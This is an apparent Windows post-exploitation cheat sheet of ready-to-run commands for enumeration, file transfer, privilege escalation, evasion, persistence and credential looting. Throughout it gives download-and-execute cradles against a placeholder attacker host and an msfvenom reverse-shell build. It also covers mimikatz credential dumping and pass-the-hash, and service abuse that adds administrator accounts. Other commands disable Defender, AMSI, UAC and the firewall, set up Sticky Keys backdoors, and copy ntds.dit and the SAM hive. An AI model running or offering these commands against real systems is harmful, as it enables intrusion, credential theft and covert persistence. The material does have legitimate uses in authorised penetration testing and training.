`` Enumeration

    `` whoami

        ~> echo %USERNAME% || whoami
        ~> wmic useraccount where name='%USERNAME%' get sid

        -- Verbose
        ~> whoami /all

    `` Users and Groups

        ~> net users
        ~> net localgroup
        ~> net localgroup Administrators
        ~> net localgroup "Remote Desktop Users"

        -- Verbose, with SIDs
        ~> wmic useraccount list full

    `` OS

        -- With simplicity
        ~> ver & echo %PROCESSOR_ARCHITECTURE%

        -- With systeminfo
        ~> systeminfo | findstr /B /C:"OS Name" /C:"OS Version" /C:"System Type"

        -- WMI variant
        ~> wmic os get OSArchitecture,Caption,Version

        `` File-based

            -- Windows XP
            - C:\Windows\System32\eula.txt

            -- Windows 7
            - C:\Windows\System32\license.rtf

            -- Windows 10
            - C:\Windows\System32\license.rtf (EULA code lookup)

    `` Networking

        ~> ipconfig /all
        ~> arp -a

        -- Routing
        ~> route print
        ~> netstat -r

        -- Listening TCP sockets
        ~> netstat -ano -p tcp | findstr LISTENING

        -- Listening UDP sockets
        ~> netstat -ano -p udp | findstr LISTENING

        -- Find a binary behind the specific port
        ~> for /f "tokens=3 delims=LISTENING" %i in ('netstat -ano ^| findstr "VAR_INTEGER"') do tasklist /fi "pid eq %i"
        ~PS> netstat -aon | Select-String VAR_INTEGER | ForEach-Object { $_ -replace '\s+', ',' } | ConvertFrom-Csv -Header @('Empty', 'Protocol', 'AddressLocal', 'AddressForeign', 'State', 'PID') | ForEach-Object { $portProcess = Get-Process | Where-Object Id -eq $_.PID; $_ | Add-Member -NotePropertyName 'ProcessName' -NotePropertyValue $portProcess.ProcessName; Write-Output $_ } | Sort-Object ProcessName, State, Protocol, AddressLocal, AddressForeign | Select-Object  ProcessName, State, Protocol, AddressLocal, AddressForeign | Format-Table

        -- Established connections
        ~> netstat -an | findstr ESTABLISHED

        -- Firewall Settings
        ~> netsh firewall show state

        `` In the Windows Network context

            `` General

                ~> net config workstation
                ~> net config server
                ~> net session
                ~> net use
                ~> net view
                ~> net view /domain
                ~> net accounts /domain

            `` Network Shares

                ~> net share
                ~> wmic share list

            `` Windows Server (RDP)

                ~> qwinsta
                ~> quser

        `` SNMP

            ~> reg query HKLM\SYSTEM\CurrentControlSet\Services\SNMP /s
            ~PS> Get-ChildItem -â€“Path HKLM:\SYSTEM\CurrentControlSet\Services\SNMP -Recurse

        `` IPv6 support

            ~PS> Write-Host 'OS Supports IPv6: ' $( [System.Net.Sockets.Socket]::OSSupportsIPv6 )

    `` PowerShell

        ~> reg query "HKLM\SOFTWARE\Microsoft\PowerShell\1\PowerShellEngine" /v PowerShellVersion
        ~> reg query "HKLM\SOFTWARE\Microsoft\PowerShell\3\PowerShellEngine" /v PowerShellVersion

    `` Startup Items

        ~> wmic startup list brief

    `` Services

        ~> net start
        ~> sc query state= all | findstr "SERVICE_NAME DISPLAY_NAME STATE"
        ~> accesschk.exe -uwcqv * /accepteula

        `` Unquoted Service Paths

            ~> wmic service get Name,DisplayName,PathName,StartMode | findstr /i "Auto" | findstr /i /v "C:\Windows\\" |findstr /i /v """

        `` Weak Permissions

            -- Filesystem
            ~> accesschk.exe -uwcqv "Authenticated Users" * /accepteula
            ~> accesschk.exe -uwcqv "Everyone" * /accepteula
            ~> accesschk.exe -uwcqv "Users" * /accepteula

            -- Registry
            ~> accesschk.exe -kvqwsu "Authenticated Users" "HKLM\SYSTEM\CurrentControlSet\Services" /accepteula
            ~> accesschk.exe -kvqwsu "Everyone" "HKLM\SYSTEM\CurrentControlSet\Services" /accepteula
            ~> accesschk.exe -kvqwsu "Users" "HKLM\SYSTEM\CurrentControlSet\Services" /accepteula

    `` Installed software

        ~> dir /a "C:\Program Files" "C:\Program Files (x86)"
        ~> reg query HKEY_LOCAL_MACHINE\SOFTWARE

        -- Verbose but takes time
        ~> wmic product get Name,Version

        -- Drivers
        ~> driverquery

        -- AV
        ~> wmic /node:localhost /namespace:\\root\SecurityCenter2 path AntiVirusProduct get DisplayName /format:list

        -- Installed Patches
        ~> wmic qfe get Caption,Description,HotFixID,InstalledOn

    `` Processes

        ~> tasklist /svc
        ~> tasklist /v /fi "username eq system"

        -- Verbose
        ~> wmic process list

    `` Scheduled Tasks

        ~> schtasks /query /fo LIST /v
        ~> schtasks /query /fo LIST 2>nul | findstr "VAR_STRING"

    `` Logging

        ~> reg query HKLM\Software\Microsoft\Windows\CurrentVersion\Policies\System\Audit
        ~> reg query HKLM\Software\Policies\Microsoft\Windows\EventLog\EventForwarding\SubscriptionManager
        ~> reg query HKLM\Software\Policies\Microsoft\Windows\PowerShell\ScriptBlockLogging
        ~> reg query HKLM\Software\Policies\Microsoft\Windows\PowerShell\Transcription
        ~> wevutil el

    `` AppLocker

        ~PS> (Get-AppLockerPolicy -Local).RuleCollections
        ~PS> Get-ChildItem -Path HKLM:Software\Policies\Microsoft\Windows\SrpV2 -Recurse
        ~> reg query HKEY_LOCAL_MACHINE\Software\Policies\Microsoft\Windows\SrpV2\Exe\

     `` Interesting files

        - %SYSTEMROOT%\Panther\Unattend.xml
        - %SYSTEMROOT%\Panther\Unattend\Unattend.xml
        - %SYSTEMROOT%\system32\sysprep.inf
        - %SYSTEMROOT%\system32\sysprep\sysprep.xml
        - %SYSTEMROOT%\ntds
        - %SYSTEMROOT%\System32\GroupPolicy\Machine
        - %SYSTEMROOT%\System32\GroupPolicy\User
        - %SYSTEMROOT%\System32\GroupPolicyUsers
        - %SYSTEMDRIVE%\pagefile.sys
        - %SYSTEMROOT%\debug\NetSetup.log
        - %SYSTEMROOT%\iis6.log
        - %SYSTEMROOT%\iis7.log
        - %SYSTEMROOT%\iis8.log
        - %SYSTEMROOT%\Panther\Unattend.txt
        - %SYSTEMROOT%\Panther\Unattend\Unattended.xml
        - %SYSTEMROOT%\Panther\Unattended.xml
        - %SYSTEMROOT%\php.ini
        - %SYSTEMROOT%\repair\SAM
        - %SYSTEMROOT%\repair\security
        - %SYSTEMROOT%\repair\software
        - %SYSTEMROOT%\repair\system
        - %SYSTEMROOT%\system32\CCM\logs\*.log
        - %SYSTEMROOT%\system32\config\AppEvent.Evt
        - %SYSTEMROOT%\system32\config\default.sav
        - %SYSTEMROOT%\system32\config\regback\default
        - %SYSTEMROOT%\System32\config\RegBack\SAM
        - %SYSTEMROOT%\System32\config\RegBack\system
        - %SYSTEMROOT%\system32\config\regback\security
        - %SYSTEMROOT%\system32\config\regback\software
        - %SYSTEMROOT%\System32\config\SAM
        - %SYSTEMROOT%\system32\config\SecEvent.Evt
        - %SYSTEMROOT%\system32\config\security.sav
        - %SYSTEMROOT%\system32\config\software.sav
        - %SYSTEMROOT%\System32\config\SYSTEM
        - %SYSTEMROOT%\system32\config\system.sav
        - %SYSTEMROOT%\System32\drivers\etc\hosts
        - %SYSTEMROOT%\System32\drivers\etc\networks
        - %SYSTEMROOT%\system32\inetsrv\config\applicationHost.config
        - %SYSTEMROOT%\system32\inetsrv\config\schema\ASPNET_schema.xml
        - %SYSTEMROOT%\system32\logfiles\httperr\httperr1.log
        - %SYSTEMROOT%\system32\sysprep
        - %SYSTEMROOT%\win.ini
        - %SYSTEMROOT%\windowsupdate.log
        - %USERPROFILE%\ntuser.dat
        - %USERPROFILE%\Application Data\Microsoft\Credentials\
        - %SYSTEMDRIVE%\apache\logs\access.log
        - %SYSTEMDRIVE%\apache\logs\error.log
        - %SYSTEMDRIVE%\apache\php\php.ini
        - %SYSTEMDRIVE%\Autounattend.xml
        - %SYSTEMDRIVE%\boot.ini
        - %SYSTEMDRIVE%\Documents and Settings\Administrator\desktop\desktop.ini
        - %SYSTEMDRIVE%\Documents and Settings\Administrator\NTUser.dat
        - %SYSTEMDRIVE%\Documents and Settings\Administrator\ntuser.ini
        - %SYSTEMDRIVE%\inetpub\logs\LogFiles\
        - %SYSTEMDRIVE%\inetpub\wwwroot\
        - %SYSTEMDRIVE%\inetpub\wwwroot\global.asa
        - %SYSTEMDRIVE%\inetpub\wwwroot\web.config
        - %SYSTEMDRIVE%\MySQL\data\hostname.err
        - %SYSTEMDRIVE%\MySQL\data\mysql.err
        - %SYSTEMDRIVE%\MySQL\data\mysql.log
        - %SYSTEMDRIVE%\MySQL\my.cnf
        - %SYSTEMDRIVE%\MySQL\my.ini
        - %SYSTEMDRIVE%\php4\php.ini
        - %SYSTEMDRIVE%\php5\php.ini
        - %SYSTEMDRIVE%\php\php.ini
        - %SYSTEMDRIVE%\Program Files (x86)\Apache Group\Apache2\conf\httpd.conf
        - %SYSTEMDRIVE%\Program Files (x86)\Apache Group\Apache\conf\access.log
        - %SYSTEMDRIVE%\Program Files (x86)\Apache Group\Apache\conf\error.log
        - %SYSTEMDRIVE%\Program Files (x86)\Apache Group\Apache\conf\httpd.conf
        - %SYSTEMDRIVE%\Program Files (x86)\FileZilla Server\FileZilla Server.xml
        - %SYSTEMDRIVE%\Program Files (x86)\xampp\apache\conf\httpd.conf
        - %SYSTEMDRIVE%\Program Files\Apache Group\Apache2\conf\httpd.conf
        - %SYSTEMDRIVE%\Program Files\Apache Group\Apache\conf\httpd.conf
        - %SYSTEMDRIVE%\Program Files\Apache Group\Apache\logs\access.log
        - %SYSTEMDRIVE%\Program Files\Apache Group\Apache\logs\error.log
        - %SYSTEMDRIVE%\Program Files\FileZilla Server\FileZilla Server.xml
        - %SYSTEMDRIVE%\Program Files\MySQL\data\hostname.err
        - %SYSTEMDRIVE%\Program Files\MySQL\data\mysql-bin.log
        - %SYSTEMDRIVE%\Program Files\MySQL\data\mysql.err
        - %SYSTEMDRIVE%\Program Files\MySQL\data\mysql.log
        - %SYSTEMDRIVE%\Program Files\MySQL\my.cnf
        - %SYSTEMDRIVE%\Program Files\MySQL\my.ini
        - %SYSTEMDRIVE%\Program Files\MySQL\MySQL Server 5.0\data\hostname.err
        - %SYSTEMDRIVE%\Program Files\MySQL\MySQL Server 5.0\data\mysql-bin.log
        - %SYSTEMDRIVE%\Program Files\MySQL\MySQL Server 5.0\data\mysql.err
        - %SYSTEMDRIVE%\Program Files\MySQL\MySQL Server 5.0\data\mysql.log
        - %SYSTEMDRIVE%\Program Files\MySQL\MySQL Server 5.0\my.cnf
        - %SYSTEMDRIVE%\Program Files\MySQL\MySQL Server 5.0\my.ini
        - %SYSTEMDRIVE%\Program Files\MySQL\MySQL Server 5.1\my.ini
        - %SYSTEMDRIVE%\sysprep.inf
        - %SYSTEMDRIVE%\sysprep\sysprep.inf
        - %SYSTEMDRIVE%\sysprep\sysprep.xml
        - %SYSTEMDRIVE%\Unattend.xml
        - %SYSTEMDRIVE%\Users\Administrator\Desktop\desktop.ini
        - %SYSTEMDRIVE%\Users\Administrator\NTUser.dat
        - %SYSTEMDRIVE%\Users\Administrator\NTUser.ini
        - %SYSTEMDRIVE%\xampp\apache\bin\php.ini
        - %SYSTEMDRIVE%\xampp\apache\conf\httpd.conf
        - %SYSTEMDRIVE%\xampp\apache\logs\access.log
        - %SYSTEMDRIVE%\xampp\apache\logs\error.log
        - %SYSTEMDRIVE%\xampp\security\webdav.htpasswd
        - %SYSTEMDRIVE%\xampp\tomcat\conf\tomcat-users.xml
        - %SYSTEMDRIVE%\xampp\tomcat\conf\web.xml
        - %SYSTEMDRIVE%\xampp\webalizer\webalizer.conf
        - %SYSTEMDRIVE%\xampp\webdav\webdav.txt

    `` Weak Permissions

        ~> icacls "C:\Documents and Settings\*" 2>nul | findstr "(F)" | findstr "BUILTIN\Users"
        ~> icacls "C:\Documents and Settings\*" 2>nul | findstr "(F)" | findstr "Everyone"
        ~> icacls "C:\Documents and Settings\*" 2>nul | findstr "(M)" | findstr "BUILTIN\Users"
        ~> icacls "C:\Documents and Settings\*" 2>nul | findstr "(M)" | findstr "Everyone"
        ~> icacls "C:\Program Files (x86)\*" 2>nul | findstr "(F)" | findstr "BUILTIN\Users"
        ~> icacls "C:\Program Files (x86)\*" 2>nul | findstr "(F)" | findstr "Everyone"
        ~> icacls "C:\Program Files (x86)\*" 2>nul | findstr "(M)" | findstr "BUILTIN\Users"
        ~> icacls "C:\Program Files (x86)\*" 2>nul | findstr "(M)" | findstr "Everyone"
        ~> icacls "C:\Program Files\*" 2>nul | findstr "(F)" | findstr "BUILTIN\Users"
        ~> icacls "C:\Program Files\*" 2>nul | findstr "(F)" | findstr "Everyone"
        ~> icacls "C:\Program Files\*" 2>nul | findstr "(M)" | findstr "BUILTIN\Users"
        ~> icacls "C:\Program Files\*" 2>nul | findstr "(M)" | findstr "Everyone"
        ~> icacls "C:\Users\*" 2>nul | findstr "(F)" | findstr "BUILTIN\Users"
        ~> icacls "C:\Users\*" 2>nul | findstr "(F)" | findstr "Everyone"
        ~> icacls "C:\Users\*" 2>nul | findstr "(M)" | findstr "BUILTIN\Users"
        ~> icacls "C:\Users\*" 2>nul | findstr "(M)" | findstr "Everyone"
        ~> accesschk.exe -uwdqs "Users" c:\ /accepteula
        ~> accesschk.exe -uwdqs "Authenticated Users" c:\ /accepteula
        ~> accesschk.exe -uwqs "Everyone" * /accepteula
        ~> accesschk.exe -uwqs "Authenticated Users" c:\*.* /accepteula
        ~> accesschk.exe -uwqs "Users" c:\*.* /accepteula
        ~PS> Get-ChildItem -Recurse | Get-Acl | out-string -stream | select-string -pattern "Everyone"

        -- Access for given user
        ~> icacls c:\*. /findsid VAR_USERNAME /t /c /l 2>nul

    `` Sensitive data

        ~> dir /S /B *pass*.txt == *pass*.xml == *pass*.ini == *cred* == *vnc* == *.config* 2>nul
        ~> cd C:\ && findstr /SI /M password *.xml *.ini *.txt *.config *.cfg 2>nul
        ~PS> Get-Childitem â€“Path C:\Users\ -Include *pass*,*cred*,*vnc*,*.config -File -Recurse -ErrorAction SilentlyContinue
        ~PS> Get-ChildItem C:\* -include *.xml,*.ini,*.txt,*.config -Recurse -ErrorAction SilentlyContinue | Select-String -Pattern "password"

`` File transfer

    `` BitsAdmin

        ~> cmd.exe /c "bitsadmin /transfer myjob /download /priority high http://VAR_ATTACKER_HOST/accesschk.exe accesschk.exe

        ~PS> Import-Module BitsTransfer
        ~PS> Start-BitsTransfer -Source $url -Destination $output

    `` certutil

        ~> certutil.exe -urlcache -split -f "http://VAR_ATTACKER_HOST/file.b64" & certutil.exe -f -decode Blob0_0.bin accesschk.exe & del Blob0_0.bin
        ~> certutil.exe -urlcache -split -f "http://VAR_ATTACKER_HOST/file.b64" & certutil.exe -f -decode accesschk.b64 accesschk.exe & del accesschk.b64

    `` Non-interactive FTP

        `` Script

            @ snippets/windows/utils/ftp.bat

    `` Powershell

        `` Script

            @ snippets/windows/utils/wget_ps1.bat

        `` CLI

            ~> powershell Invoke-WebRequest -Uri http://VAR_ATTACKER_HOST/nc.exe -OutFile C:\nc.exe
            ~> powershell -c "(new-object System.Net.WebClient).DownloadFile('http://VAR_ATTACKER_HOST/file.exe','C:\Users\user\Desktop\file.exe')"
            ~PS> $h=New-Object -com Msxml2.XMLHTTP;$h.open('GET','http://VAR_ATTACKER_HOST/script.ps1',$false);$h.send();iex $h.responseText
            ~PS> $h=New-Object -com WinHttp.WinHttpRequest.5.1;$h.open('GET','http://VAR_ATTACKER_HOST/script.ps1',$false);$h.send();iex $h.responseText
            ~PS> $h=New-Object Net.HttpListener;$h.Prefixes.Add("http://+:8000/");$h.Start();While ($h.IsListening){$HC=$h.GetContext();$HRes=$HC.Response;$HRes.Headers.Add("Content-Type","text/plain");$Buf=[Text.Encoding]::UTF8.GetBytes((GC (Join-Path $Pwd ($HC.Request).RawUrl)));$HRes.ContentLength64=$Buf.Length;$HRes.OutputStream.Write($Buf,0,$Buf.Length);$HRes.Close()};$h.Stop()
            ~PS> $ie=New-Object -com InternetExplorer.Application;$ie.visible=$False;$ie.navigate('http://VAR_ATTACKER_HOST/script.ps1');start-sleep -s 5;$r=$ie.Document.body.innerHTML;$ie.quit();IEX $r
            ~PS> IEX (iwr 'http://VAR_ATTACKER_HOST/script.ps1')
            ~PS> IEX (New-Object Net.Webclient).downloadstring("http://VAR_ATTACKER_HOST/script.ps1")
            ~PS> Import-Module bitstransfer;Start-BitsTransfer 'http://VAR_ATTACKER_HOST/script.ps1' $env:temp\t;$r=gc $env:temp\t;rm $env:temp\t; iex $r

        `` DNS

            ~PS> IEX ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String(((nslookup -querytype=txt "SERVER" | Select -Pattern '"*"') -split '"'[0]))))

        `` Base64

            ~$ cat cmd.txt | iconv -t UTF-16LE -f UTF-8 | base64 -w0
            ~> powershell.exe -NoP -NonI -W Hidden -Exec Bypass -enc "JABjAGwAaQBlAG4AdAAgA...UAKAApAAoA"

    `` VBS

        `` Script

            @ snippets/windows/utils/wget_vbs.bat

    `` Powershell listener

        @ snippets/windows/shells/bind/PortListener.ps1

    `` Base64 encoder VBS

        @ snippets/windows/utils/base64.vbs

`` Privilege escalation

    `` Ideas

        - Access to sensitive files such as the Windows SAM file
        - Always Install Elevated
        - Autologon User Credential
        - DLL Hijacking by overwriting poorly secured DLLs
        - DLL Injection
        - Group Policy Preferences
        - Insecure File/Folder Permissions
        - Insecure Named Pipes Permissions
        - Insecure Registry Permissions
        - Insecure Service Permissions
        - Installation scripts and data containing passwords
        - Registry settings such as always elevated and automatically executed binaries
        - Scheduled tasks that execute scripts and programs
        - Stored Credentials
        - Token Manipulation
        - Unattended Answer File
        - Unquoted Service Path
        - User Account Control (UAC) Bypass
        - Vulnerable software running with high privileges
        - Windows Kernel Exploit

    `` Services

        ~> sc qc upnphost
        ~> sc config upnphost binpath= "net user VAR_USERNAME VAR_PASSWORD /add && net localgroup Administrators VAR_USERNAME /add" type= interact
        ~> sc config upnphost obj= ".\LocalSystem" password=""
        ~> net stop upnphost
        ~> net start upnphost

        ~PS> Get-Service -name "VAR_STRING*" | Set-Service -StartupType "disabled"
        ~PS> Stop-Process -force -name VAR_STRING*

    `` mimikatz

        ~> mimikatz "privilege::debug" "sekurlsa::logonPasswords" exit
        ~> mimikatz "privilege::debug" "token::elevate" "sekurlsa::logonPasswords" exit
        ~> mimikatz "privilege::debug" "token::elevate" "sekurlsa::logonPasswords" "lsadump::lsa" "lsadump::trust" exit
        ~> mimikatz "privilege::debug" "token::elevate /domainadmin" exit
        token::run cmd.exe
        sekurlsa::pth /user:VAR_USERNAME /domain:VAR_DOMAIN /ntlm:VAR_HASH /run:cmd

`` Evasion

    `` LOLBINs

        ~> cmd.exe /k < \\VAR_ATTACKER_HOST\folder\batchfile.txt
        ~> cscript //E:jscript \\VAR_ATTACKER_HOST\folder\payload.txt
        ~> mshta vbscript:Close(Execute("GetObject(""script:http://VAR_ATTACKER_HOST/payload.sct"")"))
        ~> mshta http://VAR_ATTACKER_HOST/payload.hta
        ~> mshta \\VAR_ATTACKER_HOST\folder\payload.hta
        ~> rundll32.exe \\VAR_ATTACKER_HOST\folder\payload.dll,entrypoint
        ~> rundll32.exe javascript:"\..\mshtml,RunHTMLApplication";o=GetObject("script:http://VAR_ATTACKER_HOST/payload.sct");window.close();
        ~> rundll32.exe javascript:"\..\mshtml,RunHTMLApplication";eval("w=new%20ActiveXObject(\"WScript.Shell\");w.Exec(\"calc\")");
        ~> wmic os get /format:"https://VAR_ATTACKER_HOST/payload.xsl"
        ~> C:\Windows\Microsoft.NET\Framework64\v4.0.30319\regasm.exe /u \\VAR_ATTACKER_HOST\folder\payload.dll
        ~> regsvr32 /u /n /s /i:http://VAR_ATTACKER_HOST/payload.sct scrobj.dll
        ~> regsvr32 /u /n /s /i:\\VAR_ATTACKER_HOST\folder\payload.sct scrobj.dll
        ~> odbcconf /s /a {regsvr \\VAR_ATTACKER_HOST\folder\payload_dll.txt}
        ~> cmd /V /c "set MB="C:\Windows\Microsoft.NET\Framework64\v4.0.30319\MSBuild.exe" & !MB! /noautoresponse /preprocess \\VAR_ATTACKER_HOST\folder\payload.xml > payload.xml & !MB! payload.xml"
        ~> certutil -urlcache -split -f http://VAR_ATTACKER_HOST/payload.b64 payload.b64 & certutil -decode payload.b64 payload.dll & C:\Windows\Microsoft.NET\Framework64\v4.0.30319\InstallUtil /logfile= /LogToConsole=false /u payload.dll
        ~> rundll32 c:\windows\system32\ieframe.dll,OpenURL 1.url

    `` AlwaysInstallElevated

        ~> reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer\AlwaysInstallElevated
        ~> reg query HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer\AlwaysInstallElevated

    `` Antivirus

        `` Disabling

            ~PS> Set-MpPreference -DisableRealtimeMonitoring $true

        `` Invoke-Mimikatz "obfuscation"

            ~$ sed -i -e 's/Invoke-Mimikatz/Invoke-Minidoggiez/g' Invoke-Minidoggiez.ps1
            ~$ sed -i -e '/<#/,/#>/c\\' Invoke-Minidoggiez.ps1
            ~$ sed -i -e 's/^[[:space:]]*#.*$//g' Invoke-Minidoggiez.ps1
            ~$ sed -i -e 's/DumpCreds/DumpCred/g' Invoke-Minidoggiez.ps1
            ~$ sed -i -e 's/ArgumentPtr/NotTodayPal/g' Invoke-Minidoggiez.ps1
            ~$ sed -i -e 's/CallDllMainSC1/ThisIsNotTheStringYouAreLookingFor/g' Invoke-Minidoggiez.ps1
            ~$ sed -i -e "s/\-Win32Functions \$Win32Functions$/\-Win32Functions \$Win32Functions #\-/g" Invoke-Minidoggiez.ps1

        `` In-memory Mimikatz (use mimidogz instead)

            ~PS> $browser = New-Object System.Net.WebClient
            ~PS> $browser.Proxy.Credentials =[System.Net.CredentialCache]::DefaultNetworkCredentials
            ~PS> mimi= $browser.DownloadString("http://VAR_ATTACKER_HOST/Invoke-Mimikatz.ps1")
            ~PS> Invoke-Expression(mimi)
            ~PS> Invoke-Mimikatz

        `` Hyperion

            ~$ msfvenom -p windows/shell_reverse_tcp lhost=VAR_ATTACKER_HOST lport=VAR_ATTACKER_PORT -f exe -e x86/shikata_ga_nai -i 9 -x /usr/share/windows-binaries/plink.exe -o foobar.exe
            ~$ cp /usr/share/windows-binaries/Hyperion-1.0.zip .
            ~$ unzip Hyperion-1.0.zip
            ~$ cd Hyperion-1.0/
            ~$ Hyperion-1.0# i686-w64-mingw32-g++ Src/Crypter/*.cpp -o hyperion.exe
            ~$ Hyperion-1.0# cp -p /usr/lib/gcc/i686-w64-mingw32/6.1-win32/libgcc_s_sjlj-1.dll .
            ~$ Hyperion-1.0# cp -p /usr/lib/gcc/i686-w64-mingw32/6.1-win32/libstdc++-6.dll .
            ~$ Hyperion-1.0# wine hyperion.exe ../foobar.exe ../crypted.exe

    `` Disable Windows Defender

        ~> sc stop WinDefend

        ~PS> "C:\Program Files\Windows Defender\mpcmdrun.exe" -RemoveDefinitions -All Set-MpPreference -DisableIOAVProtection $true
        ~PS> powershell -c "Add-MpPreference -ExclusionPath C:\\"

    `` Disable AMSI

        ~PS> [Ref].Assembly.GetType('System.Management.Automation.AmsiUtils').GetField('amsiInitFailed', 'NonPublic,Static').SetValue($null,$true)

    `` Disable UAC

        ~> reg add "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System" /f /v "FilterAdministratorToken" /t REG_DWORD /d 0x00000000

    `` Reading files

        ~PS> .\Invoke-NinjaCopy.ps1 -Path "C:\Windows\System32\config\system" -LocalDestination c:\%TEMP\system.bak
        ~PS> .\Invoke-NinjaCopy.ps1 -Path "C:\Windows\System32\config\sam" -LocalDestination c:\%TEMP\sam.bak

    `` JScript Assembly

        [Reflection.Assembly]::LoadWithPartialName('Microsoft.JScript');$js = 'var js = new ActiveXObject("WScript.Shell");js.Run("calc");'[Microsoft.JScript.Eval]::JScriptEvaluate($js,[Microsoft.JScript.Vsa.VsaEngine]::CreateEngine());

    `` XML/XSL

        ~PS> $s=New-Object System.Xml.Xsl.XsltSettings;$r=New-Object System.Xml.XmlUrlResolver;$s.EnableScript=1;$x=New-Object System.Xml.Xsl.XslCompiledTransform;$x.Load('http://VAR_ATTACKER_HOST/xsl-notepad.xsl',$s,$r);$x.Transform('http://VAR_ATTACKER_HOST/xsl-notepad.xml','z');del z;

    `` SCT

        `` Powershell VBScript Assembly SCT "Fetch & Execute"

            ~PS> [Reflection.Assembly]::LoadWithPartialName('Microsoft.VisualBasic');[Microsoft.VisualBasic.Interaction]::GetObject('script:http://VAR_ATTACKER_HOST/notepad.sct').Exec(0)

        `` Powershell JScript Assembly SCT "Fetch & Execute"

            ~PS> [Reflection.Assembly]::LoadWithPartialName('Microsoft.JScript');[Microsoft.JScript.Eval]::JScriptEvaluate('GetObject("script:http://VAR_ATTACKER_HOST/notepad.sct").Exec()',[Microsoft.JScript.Vsa.VsaEngine]::CreateEngine())

    `` Loading .Net/C# Assemblies to Bypass AppLocker Default Rules w/ PowerShell Diagnostic Scripts

        ~> powershell -v 2 -ep bypass
        ~PS> cd C:\windows\diagnostics\system\AERO
        ~PS> import-module .\CL_LoadAssembly.ps1
        ~PS> LoadAssemblyFromPath ..\..\..\..\path\assembly.exe
        ~PS> [name.space]::executesomething()

    `` Command Invocation w/ PowerShell Diagnostic Scripts

        ~> powershell -v 2 -ep bypass
        ~PS> cd C:\windows\diagnostics\system\AERO
        ~PS> import-module CL_Invocation.ps1
        ~PS> SyncInvoke notepad.exe

    `` PowerShell CL Download Cradle

        ~PS> $a = New-Object System.Xml.XmlDocument
        ~PS> $a.Load("http://VAR_ATTACKER_HOST/notepad.xml")
        ~PS> $a.command.a.execute | iex

    `` Installing root certificate

            ~> certutil.exe -addstore -f -user Root %TEMP%\cert.cer
            ~PS> Import-Certificate -FilePath %TEMP%\cert.cer -CertStoreLocation Cert:\CurrentUser\Root\

    `` diskshadow.exe

        `` Interactive

            ~> c:\windows\system32\diskshadow.exe
            > exec calc.exe
            > exec "cmd.exe" /c calc.exe
            > exit

        `` Script (diskshadow.txt)

            set context persistent nowriters
            add volume c: alias someAlias
            create
            expose %someAlias% z:
            exec "cmd.exe" /c copy z:\windows\ntds\ntds.dit c:\exfil\ntds.dit
            exec "cmd.exe" /c reg.exe save hklm\system c:\exfil\system.bak
            delete shadows volume %someAlias%
            reset

        `` Execution

            ~> diskshadow.exe /s c:\test\diskshadow.txt

        `` Persistence

            ~> schtasks /create /sc hourly /tn VSSTask /tr "diskshadow.exe /s c:\test\diskshadow.txt"

            ~> reg add HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Run /v VSSRun /t REG_EXPAND_SZ /d "diskshadow.exe /s c:\test\diskshadow.txt"

`` Persistence

    `` Registry

        -- Screen saver
        ~> reg add "HKCU\Control Panel\Desktop" /v SCRNSAVE.EXE /d c:\shell.cmd

        ~PS> New-ItemProperty -Path HKCU:\Software\Microsoft\Windows\CurrentVersion\Run -Name PersistCalc -PropertyType String -Value "C:\Windows\System32\calc.exe"

    `` Accounts

        `` CLI

            ~> net user VAR_USERNAME VAR_PASSWORD /add
            ~> net localgroup administrators VAR_USERNAME /add
            ~> net localgroup "Remote Desktop Users" VAR_USERNAME /add

        `` useradd.c

            @ snippets/windows/backdoors/useradd.c

    `` Services

            @ snippets/windows/backdoors/service.bat

    `` Scheduler

        `` Create new task and execute it

            ~> schtasks /create /tn VAR_STRING /tr c:\windows\temp\foobar.exe /sc once /st 00:00 /S VAR_TARGET_HOST /RU System
            ~> schtasks /run /tn VAR_STRING /S VAR_TARGET_HOST

            ~> schtasks /create /sc minute /mo 10 /tn VAR_STRING /tr c:\windows\temp\foobar.exe

        `` Delete the task after it is executed

            ~> schtasks /F /delete /tn VAR_STRING /S VAR_TARGET_HOST

    `` RDP

        ~> net start TermService
        ~> netsh add portopening TCP 3389 "Remote Desktop"
        ~> netsh advfirewall set allprofiles state off
        ~> netsh advfirewall show allprofiles
        ~> netsh firewall set opmode disable
        ~> netsh firewall set service remoteadmin enable
        ~> netsh firewall set service type = remotedesktop mode = enable
        ~> sc config TermService start=auto

        ~> reg add "HKEY_LOCAL_MACHINE\SYSTEM\currentControlSet\Control\Terminal Server" /v "AllowTSConnections" /t REG_DWORD /d 0x1 /f
        ~> reg add "HKEY_LOCAL_MACHINE\SYSTEM\currentControlSet\Control\Terminal Server" /v "fDenyTSConnections" /t REG_DWORD /d 0x0 /f
        ~> reg add "HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Terminal Server" /v "fAllowToGetHelp" /t REG_DWORD /d 0x1 /f
        ~> reg add "HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Terminal Server\WinStations\RDP-Tcp" /v "UserAuthentication" /t REG_DWORD /d 0x0 /f

    `` Enabling scripts in Outlook client

        `` Outlook 2016

            ~> reg add "HKEY_CURRENT_USER\Software\Microsoft\Office\16.0\Outlook\Security" /v "EnableUnsafeClientMailRules" /t REG_DWORD /d 0x1 /f

        `` Outlook 2013

            ~> reg add "HKEY_CURRENT_USER\Software\Microsoft\Office\15.0\Outlook\Security" /v "EnableUnsafeClientMailRules" /t REG_DWORD /d 0x1 /f

        `` Outlook 2010

            ~> reg add "HKEY_CURRENT_USER\Software\Microsoft\Office\14.0\Outlook\Security" /v "EnableUnsafeClientMailRules" /t REG_DWORD /d 0x1 /f

    `` Physical access

        `` Replace with cmd.exe (Sticky Keys)

            -- SHIFT 5 times
            C:\Windows\System32\sethc.exe

            -- WINDOWS+U
            C:\Windows\System32\Utilman.exe

            -- WINDOWS+U, on-screen keyboard
            C:\Windows\System32\osk.exe

            -- WINDOWS+P
            C:\Windows\System32\DisplaySwitch.exe

        `` Windows 10 (virtual keyboard)

            ~> reg add "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\osk.exe" /v "Debugger" /t REG_SZ /d "cmd.exe" /f

    `` Runas

        @ snippets/windows/utils/runas*

`` Looting

    `` Passwords

        `` Registry

            ~> reg save HKLM\SYSTEM %TEMP%\SYSTEM.bak
            ~> reg save HKLM\SAM %TEMP%\SAM.bak
